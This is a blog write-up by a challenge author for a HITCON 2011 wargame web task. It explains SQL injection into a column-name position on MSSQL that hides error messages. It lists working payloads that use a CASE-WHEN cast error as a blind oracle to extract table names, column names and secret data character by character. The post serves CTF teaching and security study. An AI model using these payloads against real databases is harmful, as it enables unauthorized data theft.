---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-3/
title: "台灣駭客年會 HITCON2011，Wargame Web 3出題心得 & 解法 | Orange Tsai"
author: "Orange Tsai"
published: 2011-07-24T16:00:00.000Z
description: "心得：這題出現的形式以及解法都是Real case in real world的，整個網站很安全都用Prepared statement保護SQL sentence，但是插入column name的時候就不能使用Prepared statement了，整個網站很安全剛好被我遇到這個地方，當初遇到時想了一下認為無法利用，但後來思考了一下查了一下msdn SQL server的一些用法找出了利用方法，"
---

* * *

心得：這題出現的形式以及解法都是Real case in real world的，整個網站很安全都用Prepared statement保護SQL sentence，但是插入column name的時候就不能使用Prepared statement了，整個網站很安全剛好被我遇到這個地方，當初遇到時想了一下認為無法利用，但後來思考了一下查了一下msdn SQL server的一些用法找出了利用方法，覺得很有趣於是把它變成了題目。

題目是一個網址

> /GetEvent.asp?s=b.\_\_name

顯示的是一個空白頁面

> /GetEvent.asp?s=b.\_\_name’

顯示 500 Error，不會吐露錯誤訊息

當SQL語法出錯時出現500，其他正常查詢不論有無資料皆回傳空白頁面

整個設計的SQL sentence大致如下

> sql = “Select a.\_\_id, “ + s + “, c.\_\_user, d.\_\_pwd, e.\_\_mail from \_id as a, \_name as b, \_user as c, \_pwd as d, \_mail as e”

- `s`是可以插入的地方
- `b`是 alias的 table name
- `__name`是column name

在不知道整個SQL語句的狀況下

- 一般的SQL server爆錯 -> 不行，因為不會顯示錯誤
- 偽造整個SQL並在後面註解 -> 不行，因為不知道s前面alias 的name，偽造不出來後面的語句，等於封死了註解XD
- Blind injection -> 無論SQL select出來有無資料，皆顯示空白頁面
- Time base -> Wait for關鍵字不能用在這個地方，本來想用Heavy query延長時間但用在這個地方會失敗

後來考慮了一下是否可以穿插一個判斷式，假如是false的話執行一個會讓SQL出錯的語句(Ex cast(‘a’ as int))，但MSSQL沒有if的函數只有isnull，但是isnull接在那個地方會有問題所以後來使用了case-when的語法，插入如

> (select top 1 case len(name) when 3 then cast(user as int) end from sysobjects where xtype=’U’)

當column name的長度等於三時會顯示500 error，否則則顯示空白頁面，這時我們有了正確與錯誤的判斷標準，整個 Injection又回復到Blind上面了XD

接著可以慢慢將 table name, column name以及資料列舉出來。

> (select top 1 case len(name) when 3 then cast(user as int) end from sysobjects where xtype=’U’)

取table name長度

> (select top 1 case ascii(substring(name,1,1)) when 95 then cast(user as int) end from sysobjects where xtype=’U’)

取table name資料

> (select top 1 case len(col\_name(object\_id(‘\_key’),1)) when 5 then cast(user as int) end from sysobjects)

取column name長度

> (select top 1 case ascii(substring(col\_name(object\_id(‘\_key’),1),1,1)) when 43 then cast(user as int) end from sysobjects)

取column name資料

> (select top 1 case len(\_\_key) when 25 then cast(user as int) end from \_key)

取資料長度

> (select top 1 case ascii(substring(\_\_key,1,1)) when 83 then cast(user as int) end from \_key)

取資料內容… 整個流程大致到這裡拿到key並且結束。

如果有更好的方法歡迎交流提供 :)